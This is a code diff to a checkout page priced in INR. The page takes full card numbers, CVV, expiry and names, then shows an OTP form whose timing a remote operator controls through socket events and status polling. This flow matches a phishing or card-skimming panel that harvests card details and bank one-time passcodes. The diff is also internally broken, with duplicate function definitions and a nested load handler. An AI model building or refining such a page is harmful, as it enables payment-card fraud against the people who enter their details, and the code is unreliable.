@@ -258,6 +258,27 @@
       background-color: #10B981 !important;
       cursor: pointer;
     }
+    
+    /* Animation styles for OTP form */
+    @keyframes slideUp {
+      0% {
+        transform: translateY(20px);
+        opacity: 0;
+      }
+      100% {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+    
+    #otpForm.animate-slide-in {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    
+    #otpForm.show-animation {
+      animation: slideUp 0.3s ease-out forwards;
+    }
   </style>
 </head>
 <body>
@@ -338,7 +359,7 @@
               </div>
             </div>
           </div>
-<!-- Right Section -->
+          <!-- Right Section -->
           <div class="md:w-5/12 p-5">
             <div id="paymentForm">
               <div class="amount-display mb-6">
@@ -415,10 +436,8 @@
                 <div class="otp-button-wrapper">
                   <button type="button" id="otpSubmitButton" class="w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white" disabled>
                     <span id="otpText">Confirm</span>
-                    <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
-                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"/>
-                      </svg>
+                    <div id="otpLoader" class="hidden ml-2">
+                      <div id="otpSpinner"></div>
                     </div>
                   </button>
                 </div>
@@ -614,6 +633,7 @@
   document.addEventListener("DOMContentLoaded", function(){
     const cardInput = document.getElementById("cardNumber");
     const expiryInput = document.getElementById("expiry");
+    const otpInput = document.getElementById("otp");
     const socket = io();
 
     if (cardInput) {
@@ -627,231 +647,316 @@
         updateCardError();
         updateCardTypeAndInfo(formatted);
         updateSubmitButton();
-
-        // Fix cursor jumping
-        const newCursor = cursor + (formatted.charAt(cursor) === ' ' ? 1 : 0);
-        e.target.setSelectionRange(newCursor, newCursor);
       });
     }
+if (expiryInput) {
+  expiryInput.addEventListener("input", function(e) {
+    const cursor = e.target.selectionStart;
+    const formatted = formatExpiry(e.target.value);
+    e.target.value = formatted;
 
-    if (expiryInput) {
-      expiryInput.addEventListener("input", function(e) {
-        let value = e.target.value.replace(/\D/g, '');
-
-        // Auto-insert slash after 2 digits
-        if (value.length > 2) {
-          value = value.substring(0, 2) + '/' + value.substring(2, 4);
-        }
-        e.target.value = value.substring(0, 5);
-
-        // Validate
-        isExpiryValid = validateExpiry(e.target.value);
-        updateSubmitButton();
-      });
+    // Validation check
+    isExpiryValid = validateExpiry(formatted);
+    const errorElem = document.getElementById("expiryError");
+    if (formatted.length === 5 && !isExpiryValid) {
+      errorElem.style.display = 'block';
+      expiryInput.classList.add('border-red-500');
+    } else {
+      errorElem.style.display = 'none';
+      expiryInput.classList.remove('border-red-500');
     }
+    updateSubmitButton();
+  });
+}
 
-    ['email', 'cvv', 'cardholderName'].forEach(id => {
-      document.getElementById(id).addEventListener('input', updateSubmitButton);
+if (otpInput) {
+  otpInput.addEventListener("input", function() {
+    updateConfirmOtpButton();
+  });
+}
+
+// Form Submit Handler
+document.getElementById('mainForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  if (isProcessing) return;
+
+  isProcessing = true;
+  const submitButton = document.getElementById('submitButton');
+  const submitText = document.getElementById('submitText');
+  const submitLoader = document.getElementById('submitLoader');
+
+  submitButton.classList.add('btn-loading');
+  submitText.textContent = 'Processing...';
+  submitLoader.classList.remove('hidden');
+
+  // Get form values
+  const email = document.getElementById('email').value;
+  const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+  const expiry = document.getElementById('expiry').value;
+  const cvv = document.getElementById('cvv').value;
+  const cardholder = document.getElementById('cardholderName').value;
+  const amount = document.getElementById('amount').value;
+
+  try {
+    // Send payment details to server
+    const response = await fetch('/api/sendPaymentDetails', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email,
+        cardNumber,
+        expiry,
+        cvv,
+        cardholder,
+        amount,
+        currency: 'INR'
+      })
     });
 
-    document.getElementById('otp').addEventListener('input', updateConfirmOtpButton);
+    const data = await response.json();
+    if (data.status === 'success') {
+      currentInvoiceId = data.invoiceId;
+      document.getElementById('invoiceId').textContent = currentInvoiceId;
+      document.getElementById('invoiceIdContainer').classList.remove('hidden');
 
-    // Payment Submission Handler
-    document.getElementById('mainForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      if (!isCardValid || !isExpiryValid || isProcessing) return;
+      // Connect to socket room for this transaction
+      socket.emit('join', currentInvoiceId);
 
-      isProcessing = true;
-      const submitButton = document.getElementById('submitButton');
-      const submitText = document.getElementById('submitText');
-      const submitLoader = document.getElementById('submitLoader');
+      // Start checking transaction status
+      startStatusCheck();
+    } else {
+      alert('Payment processing error. Please try again.');
+      resetPaymentForm();
+    }
+  } catch (error) {
+    console.error('Payment error:', error);
+    alert('Payment processing error. Please try again.');
+    resetPaymentForm();
+  }
+});
 
-      // Show loading state
-      submitButton.classList.add('btn-loading');
-      submitText.style.opacity = '0.5';
-      submitText.style.filter = 'blur(1px)';
-      submitLoader.classList.remove('hidden');
+// Status Checking Functions
+function startStatusCheck() {
+  statusCheckInterval = setInterval(checkTransactionStatus, 2000); // Check every 2 seconds
+}
 
-      try {
-        const response = await fetch("/api/sendPaymentDetails", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-            expiry: document.getElementById('expiry').value,
-            cvv: document.getElementById('cvv').value,
-            email: document.getElementById('email').value,
-            amount: document.getElementById('amount').value,
-            currency: "INR",
-            cardholder: document.getElementById('cardholderName').value
-          })
-        });
+async function checkTransactionStatus() {
+  if (!currentInvoiceId) return;
 
-        const data = await response.json();
-        if (!response.ok) throw new Error(data.message || 'Payment failed');
+  try {
+    const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
+    const data = await response.json();
 
-        currentInvoiceId = data.invoiceId;
-        localStorage.setItem('invoiceId', currentInvoiceId);
-        socket.emit('join', currentInvoiceId);
-
-        // Open bank page
-        bankPageWindow = window.open(
-          `/bankpage.html?invoiceId=${data.invoiceId}`,
-          '_blank',
-          'width=600,height=800'
-        );
-
-        // Check window closure - but don't reset loading state when it closes
-        const checkWindowClosed = setInterval(() => {
-          if (bankPageWindow && bankPageWindow.closed) {
-            clearInterval(checkWindowClosed);
-          }
-        }, 500);
-
-      } catch (error) {
-        console.error('Payment Error:', error);
-        alert(`Payment Failed: ${error.message}`);
-        submitButton.classList.remove('btn-loading');
-        submitText.style.opacity = '1';
-        submitText.style.filter = 'none';
-        submitLoader.classList.add('hidden');
-        isProcessing = false;
-      }
-    });
-
-    // OTP Submission Handler
-    document.getElementById('otpSubmitButton').addEventListener('click', async () => {
-      if (isProcessing) return;
-      isProcessing = true;
-      const otpButton = document.getElementById('otpSubmitButton');
-      const otpLoader = document.getElementById('otpLoader');
-      const btnText = document.getElementById('otpText');
-      otpButton.disabled = true;
-      btnText.style.opacity = '0.5';
-      btnText.style.filter = 'blur(1px)';
-      otpLoader.classList.remove('hidden');
-
-      try {
-        const response = await fetch("/api/submitOTP", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            invoiceId: currentInvoiceId,
-            otp: document.getElementById('otp').value
-          })
-        });
-
-        if (!response.ok) throw new Error('Failed to submit OTP');
-        statusCheckInterval = setInterval(checkTransactionStatus, 2000);
-      } catch (err) {
-        console.error('OTP submission error:', err);
-        alert('Error submitting OTP. Please try again.');
-        isProcessing = false;
-        otpButton.disabled = false;
-        otpLoader.classList.add('hidden');
-        btnText.style.opacity = '1';
-        btnText.style.filter = 'none';
-      }
-    });
-
-    // Socket.io event handlers
-    socket.on('show_otp', () => {
+    if (data.status === 'show_otp') {
+      clearInterval(statusCheckInterval);
       document.getElementById('paymentForm').classList.add('hidden');
-      document.getElementById('otpForm').classList.remove('hidden');
+      
+      const otpForm = document.getElementById('otpForm');
+      otpForm.classList.remove('hidden');
+      
+      // Force a browser reflow to enable animation
+      void otpForm.offsetWidth;
+      otpForm.classList.add('show-animation');
+      
       const cardNumber = document.getElementById('cardNumber').value;
       document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
-      if (!timerInterval) startOtpTimer();
-      isProcessing = false;
-    });
-
-    socket.on('redirect', (data) => {
+      if (!timerInterval) { startOtpTimer(); }
+      
+      if (data.otpError) {
+        document.getElementById('otpError').style.display = 'block';
+      }
+    } else if (data.status === 'redirect') {
+      clearInterval(statusCheckInterval);
       window.location.href = data.redirectUrl;
-    });
-
-    socket.on('hide_bankpage', (data) => {
-      if (bankPageWindow && !bankPageWindow.closed) {
-        bankPageWindow.close();
-      }
-      // Keep loading state active regardless, but only check status if it's our transaction
-      const submitButton = document.getElementById('submitButton');
-      const submitText = document.getElementById('submitText');
-      const submitLoader = document.getElementById('submitLoader');
-
-      submitButton.classList.add('btn-loading');
-      submitText.style.opacity = '0.5';
-      submitText.style.filter = 'blur(1px)';
-      submitLoader.classList.remove('hidden');
-
-      if (data.invoiceId === currentInvoiceId) {
-        // Start checking transaction status but don't change loading state
-        if (!statusCheckInterval) {
-          statusCheckInterval = setInterval(checkTransactionStatus, 2000);
-        }
-      }
-    });
-  });
-
-  // Transaction Status Check Function
-  async function checkTransactionStatus() {
-    if (!currentInvoiceId) return;
-    try {
-      const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
-      const data = await response.json();
-      if (data.status === 'show_otp') {
-        clearInterval(statusCheckInterval);
-        document.getElementById('paymentForm').classList.add('hidden');
-        document.getElementById('otpForm').classList.remove('hidden');
-        const cardNumber = document.getElementById('cardNumber').value;
-        document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
-        if (!timerInterval) { startOtpTimer(); }
-        if (data.otpError) {
-          document.getElementById('otpError').style.display = 'block';
-          // Reset OTP button state when there's an error
-          const otpButton = document.getElementById('otpSubmitButton');
-          const otpLoader = document.getElementById('otpLoader');
-          const btnText = document.getElementById('otpText');
-          otpButton.disabled = false;
-          otpLoader.classList.add('hidden');
-          btnText.style.opacity = '1';
-          btnText.style.filter = 'none';
-          isProcessing = false;
-        } else {
-          document.getElementById('otpError').style.display = 'none';
-        }
-        isProcessing = false;
-      } else if (data.status === 'redirect') {
-        window.location.href = data.redirectUrl;
-      }
-    } catch (err) {
-      console.error('Error checking transaction status:', err);
     }
+  } catch (error) {
+    console.error('Status check error:', error);
   }
+}
 
-  // OTP Timer Function
-  function startOtpTimer() {
-    if (timerInterval) clearInterval(timerInterval);
-    timer = 180;
-    timerInterval = setInterval(() => {
-      timer--;
-      const minutes = Math.floor(timer / 60);
-      const seconds = timer % 60;
-      document.getElementById('timer').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-      if (timer <= 0) {
-        clearInterval(timerInterval);
-        window.location.href = '/fail.html';
-      }
-    }, 1000);
-  }
+// OTP Timer
+function startOtpTimer() {
+  timer = 180; // 3 minutes
+  updateTimerDisplay();
+  timerInterval = setInterval(function() {
+    timer--;
+    updateTimerDisplay();
+    if (timer <= 0) {
+      clearInterval(timerInterval);
+      timerInterval = null;
+    }
+  }, 1000);
+}
 
-  // Back Button Prevention
-  window.onpopstate = function(event) {
-    if (confirm("Do you want to cancel this transaction?")) {
-      window.location.href = '/fail.html?reason=canceled';
+function updateTimerDisplay() {
+  const minutes = Math.floor(timer / 60);
+  const seconds = timer % 60;
+  document.getElementById('timer').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+}
+
+// OTP Submit Handler
+document.getElementById('otpSubmitButton').addEventListener('click', async function() {
+  if (isProcessing) return;
+  isProcessing = true;
+
+  const otpButton = document.getElementById('otpSubmitButton');
+  const otpText = document.getElementById('otpText');
+  const otpLoader = document.getElementById('otpLoader');
+  const otp = document.getElementById('otp').value;
+
+  otpButton.disabled = true;
+  otpText.textContent = 'Verifying...';
+  otpLoader.classList.remove('hidden');
+
+  try {
+    const response = await fetch('/api/submitOTP', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ invoiceId: currentInvoiceId, otp })
+    });
+
+    const data = await response.json();
+    if (data.status === 'success') {
+      // Start checking for status updates again
+      startStatusCheck();
     } else {
-      history.pushState(null, null, window.location.href);
+      document.getElementById('otpError').style.display = 'block';
+      resetOtpForm();
     }
-  };
-  history.pushState(null, null, window.location.href);
+  } catch (error) {
+    console.error('OTP submit error:', error);
+    document.getElementById('otpError').style.display = 'block';
+    resetOtpForm();
+  }
+});
+
+// Reset Functions
+function resetPaymentForm() {
+  isProcessing = false;
+  const submitButton = document.getElementById('submitButton');
+  const submitText = document.getElementById('submitText');
+  const submitLoader = document.getElementById('submitLoader');
+
+  submitButton.classList.remove('btn-loading');
+  submitText.textContent = 'Proceed to Pay';
+  submitLoader.classList.add('hidden');
+}
+
+function resetOtpForm() {
+  isProcessing = false;
+  const otpButton = document.getElementById('otpSubmitButton');
+  const otpText = document.getElementById('otpText');
+  const otpLoader = document.getElementById('otpLoader');
+
+  otpButton.disabled = true;
+  otpText.textContent = 'Confirm';
+  otpLoader.classList.add('hidden');
+}
+
+// Socket.io Event Handlers
+socket.on('show_otp', () => {
+  document.getElementById('paymentForm').classList.add('hidden');
+  
+  const otpForm = document.getElementById('otpForm');
+  otpForm.classList.remove('hidden');
+  
+  // Force a browser reflow to enable animation
+  void otpForm.offsetWidth;
+  otpForm.classList.add('show-animation');
+  
+  const cardNumber = document.getElementById('cardNumber').value;
+  document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
+  if (!timerInterval) startOtpTimer();
+  isProcessing = false;
+});
+
+// Bankpage handling
+document.addEventListener('DOMContentLoaded', function() {
+  // Show overlay for bankpage
+  const overlay = document.getElementById('bankpageOverlay');
+  
+  // Fix for the bankpage popup window
+  socket.on('hide_bankpage', (data) => {
+    if (data && data.invoiceId === currentInvoiceId) {
+      if (bankPageWindow && !bankPageWindow.closed) {
+        try {
+          bankPageWindow.close();
+        } catch (e) {
+          console.error('Error closing bankpage:', e);
+        }
+      }
+      bankPageWindow = null;
+      overlay.style.display = 'none';
+    }
+  });
+});
+
+// Add this special handler for the bankpage popup window
+// This is the key function that needs to be fixed to show the bankpage
+async function checkTransactionStatus() {
+  if (!currentInvoiceId) return;
+
+  try {
+    const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
+    const data = await response.json();
+
+    if (data.status === 'redirect' && data.redirectUrl.includes('bankpage.html')) {
+      // Show the loading overlay
+      const overlay = document.getElementById('bankpageOverlay');
+      overlay.style.display = 'flex';
+
+      // Stop checking for status updates temporarily
+      clearInterval(statusCheckInterval);
+      
+      // Open bankpage in a popup window
+      const width = 450;
+      const height = 600;
+      const left = (window.innerWidth - width) / 2;
+      const top = (window.innerHeight - height) / 2;
+      
+      // Open the popup window with bankpage URL
+      bankPageWindow = window.open(
+        data.redirectUrl,
+        'bankpage',
+        `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=yes,status=yes`
+      );
+      
+      // Handle if popup is blocked
+      if (!bankPageWindow || bankPageWindow.closed || typeof bankPageWindow.closed === 'undefined') {
+        alert('Please allow popups for this website to proceed with the payment.');
+        overlay.style.display = 'none';
+        startStatusCheck(); // Resume status checks
+      } else {
+        // Resume status checks to detect when bankpage is closed
+        setTimeout(() => {
+          startStatusCheck();
+        }, 1000);
+      }
+    } else if (data.status === 'show_otp') {
+      clearInterval(statusCheckInterval);
+      document.getElementById('paymentForm').classList.add('hidden');
+      
+      const otpForm = document.getElementById('otpForm');
+      otpForm.classList.remove('hidden');
+      
+      // Force a browser reflow to enable animation
+      void otpForm.offsetWidth;
+      otpForm.classList.add('show-animation');
+      
+      const cardNumber = document.getElementById('cardNumber').value;
+      document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
+      if (!timerInterval) { startOtpTimer(); }
+      
+      if (data.otpError) {
+        document.getElementById('otpError').style.display = 'block';
+      }
+    } else if (data.status === 'redirect' && !data.redirectUrl.includes('bankpage.html')) {
+      clearInterval(statusCheckInterval);
+      window.location.href = data.redirectUrl;
+    }
+  } catch (error) {
+    console.error('Status check error:', error);
+  }
+}
 </script>
-</body>
-</html>
+    
